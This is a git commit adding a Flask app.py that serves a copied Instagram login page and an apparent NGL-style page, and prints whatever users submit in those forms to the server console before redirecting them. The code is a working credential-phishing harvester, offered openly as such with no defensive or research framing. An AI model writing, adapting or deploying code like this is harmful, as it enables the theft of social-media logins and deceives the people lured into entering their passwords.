b4a81d142a3ffdc938740c41fc2464ce5932b43a
Emotional-Support <99161728+Emotional-Support@users.noreply.github.com>
2023-07-21 18:27:08 +0530

    Add files via upload

---
+++ app.py
@@ -0,0 +1,38 @@
+from flask import Flask, render_template, request, redirect
+import logging
+
+app = Flask("__main__", template_folder="templates", static_folder="static")
+logging.basicConfig(level=logging.DEBUG)
+
+
+@app.route("/saanvi_17")
+def saanvi_17():
+    return render_template("home.html")
+
+
+@app.route("/abc")
+def abc():
+    return render_template("Login • Instagram.html")
+
+
+@app.route("/after")
+def after():
+    return render_template("after.html")
+
+
+@app.route("/abc", methods=["POST", "GET"])
+def run_insta_code():
+    if request.method == "POST":
+        print(request.form)
+        return redirect("http://127.0.0.1:5000/saanvi_17")
+
+
+@app.route("/saanvi_17", methods=["POST", "GET"])
+def run_ngl_code():
+    if request.method == "POST":
+        print(request.form)
+        return redirect("http://127.0.0.1:5000/after")
+
+
+if __name__ == "__main__":
+    app.run()
